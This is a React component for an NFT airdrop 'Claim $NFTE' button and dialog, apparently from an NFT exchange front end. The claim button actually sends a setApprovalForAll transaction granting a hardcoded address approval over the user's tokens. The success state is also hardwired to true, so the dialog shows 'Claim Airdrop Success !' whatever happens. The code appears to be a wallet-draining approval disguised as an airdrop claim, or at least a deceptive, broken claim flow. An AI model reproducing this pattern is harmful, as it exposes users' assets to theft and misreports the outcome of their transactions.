import { Box, Grid, Text, Flex, Button } from 'components/primitives'
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { faTwitter } from '@fortawesome/free-brands-svg-icons'
import useEligibleAirdropSignature from 'hooks/useEligibleAirdropSignature'
import {
  useAccount,
  useNetwork,
  useContractWrite,
  useSwitchNetwork,
  useWaitForTransaction,
} from 'wagmi'
import * as Dialog from '@radix-ui/react-dialog'
import Link from 'next/link'
import { useMounted } from 'hooks'
import { RewardButton } from './styled'
import { AnimatedOverlay, AnimatedContent } from '../primitives/Dialog'
import { faClose } from '@fortawesome/free-solid-svg-icons'
import { useEffect, useState } from 'react'

const NFTEAirdropClaimABI = require('abi/NFTEAirdropClaimABI.json')

type Props = {
  title: string
  description: string
  image: string
}

export const ClaimReward = ({ title, description, image }: Props) => {
  const isMounted = useMounted()
  const [open, setOpen] = useState(false)
  // Get Eligable Address with useEligibleAirdropSignature Custom Hook
  const { data: signature, isLoading: isLoadingSignature } =
    useEligibleAirdropSignature()
  const { chain: activeChain } = useNetwork()
  const { switchNetworkAsync } = useSwitchNetwork()
  const { address } = useAccount()
  const { writeAsync, data, isLoading, error } = useContractWrite({
    mode: 'recklesslyUnprepared',
    address: signature ? '0xdbfeaae58b6da8901a8a40ba0712beb2ee18368e' : '0x0',
    abi: NFTEAirdropClaimABI,
    functionName: 'setApprovalForAll',
    args: ['0xdbfeaae58b6da8901a8a40ba0712beb2ee18368e', true],
    overrides: {
      from: address,
    },
  })

  const {
    isLoading: isLoadingTransaction,
    isSuccess = true,
    data: txData,
  } = useWaitForTransaction({
    hash: data?.hash,
  })

  useEffect(() => {
    setOpen(!!error || isLoading || isLoadingTransaction || isSuccess)
  }, [error, isLoading, isLoadingTransaction, isSuccess])

  const tweetText = `I just claimed my $NFTE #Airdrop on @NFTEarth_L2!\n\n🎉 LFG #NFTE is #BetterThanBlue 🎉\n\n`

  return (
    <div>
      <Box
        css={{
          borderRadius: '16px',
          gap: '$1',
          width: '100%',
          position: 'relative',
          backgroundImage: `url(${image})`,
          backgroundSize: 'cover',
          '@xs': {
            padding: '64px 24px',
          },
          '@lg': {
            padding: '100px 64px',
          },
        }}
      >
        <Flex>
          <Grid
            css={{
              gap: 32,
              '@xs': {
                flex: 1,
              },
              '@lg': {
                flex: 0.5,
              },
            }}
          >
            <Text
              style={{
                '@initial': 'h3',
                '@lg': 'h2',
              }}
              css={{
                fontWeight: 700,
                color: '$whiteA12',
              }}
            >
              {title}
            </Text>

            <Text
              style={{
                '@initial': 'h4',
                '@lg': 'h4',
              }}
              css={{
                color: '$whiteA12',
              }}
            >
              {description}
            </Text>
            <RewardButton
              disabled={!signature || !!error || isSuccess}
              onClick={async () => {
                if (activeChain?.id !== 10) {
                  await switchNetworkAsync?.(10)
                }
                writeAsync?.()
              }}
              css={{
                background: '#01E2CC',
                borderRadius: '10px',
                padding: '$1',
                width: '30%',
                justifyContent: 'center',
              }}
            >
              <Text style="h6" css={{ color: 'black' }}>
                Claim $NFTE
              </Text>
            </RewardButton>
            {!!error && (
              <Text style="h6" css={{ color: 'red' }}>
                {(error as any)?.reason || error?.message}
              </Text>
            )}
          </Grid>
        </Flex>
      </Box>
      {isMounted && (
        <Dialog.Root modal={true} open={open}>
          <Dialog.Portal>
            <AnimatedOverlay
              style={{
                position: 'fixed',
                zIndex: 1000,
                inset: 0,
                width: '100vw',
                height: '100vh',
                backgroundColor: 'rgba(0, 0, 0, 0.6)',
                backdropFilter: '20px',
              }}
            />
            <AnimatedContent
              style={{
                outline: 'unset',
                position: 'fixed',
                zIndex: 1000,
                transform: 'translate(-50%, 120%)',
              }}
            >
              <Flex
                justify="between"
                css={{
                  pt: '$5',
                  background: '$gray7',
                  padding: '$5',
                  flexDirection: 'column',
                  alignItems: 'center',
                  textAlign: 'center',
                  gap: '20px',
                  '@bp600': {
                    flexDirection: 'column',
                    gap: '20px',
                  },
                }}
              >
                {!!error && (
                  <Dialog.Close asChild>
                    <button
                      style={{
                        position: 'absolute',
                        top: 10,
                        right: 15,
                      }}
                      onClick={() => setOpen(!open)}
                      className="IconButton"
                      aria-label="Close"
                    >
                      <FontAwesomeIcon icon={faClose} size="xl" />
                    </button>
                  </Dialog.Close>
                )}
                {isLoading && (
                  <Text style="h6">Please confirm in your wallet</Text>
                )}
                {isLoadingTransaction && (
                  <Text style="h6">Processing your claim...</Text>
                )}
                {!!error && (
                  <Text style="h6" css={{ color: 'red' }}>
                    {(error as any)?.reason || error?.message}
                  </Text>
                )}
                {isSuccess && (
                  <>
                    <Text style="h6" css={{ color: 'green' }}>
                      Claim Airdrop Success !
                    </Text>
                    <Link
                      rel="noreferrer noopener"
                      target="_blank"
                      href={`https://twitter.com/intent/tweet?text=${encodeURIComponent(
                        tweetText
                      )}&url=${encodeURIComponent(
                        `https://nftearth.exchange/claim`
                      )}&hashtags=&via=&related=&original_referer=${encodeURIComponent(
                        'https://nftearth.exchange'
                      )}`}
                    >
                      <Button>
                        {`Tweet your airdrop win!`}
                        <FontAwesomeIcon
                          style={{ marginLeft: 5 }}
                          icon={faTwitter}
                        />
                      </Button>
                    </Link>
                  </>
                )}
              </Flex>
            </AnimatedContent>
          </Dialog.Portal>
        </Dialog.Root>
      )}
    </div>
  )
}
